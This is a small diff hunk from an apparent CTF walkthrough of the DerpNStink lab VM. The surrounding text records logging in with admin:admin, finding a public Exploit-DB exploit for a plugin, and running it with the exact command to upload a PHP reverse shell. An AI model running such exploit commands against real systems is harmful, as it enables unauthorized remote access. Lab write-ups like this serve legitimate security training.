@@ -44,6 +44,7 @@ Trying admin:admin seems to login fine, but it doesn't appear to be an actual ad
 ![Image of admin](https://blu0.github.io/DNSWalkthrough/adminadmin.png)
 
 The plugin found seems to have a [public exploit available](https://www.exploit-db.com/exploits/34681/)
+
 Ran it with the [Pentest Monkey PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
 `python 34681.py -t http://derpnstink.local/weblog/ -u admin -p admin -f php-reverse-shell.php`
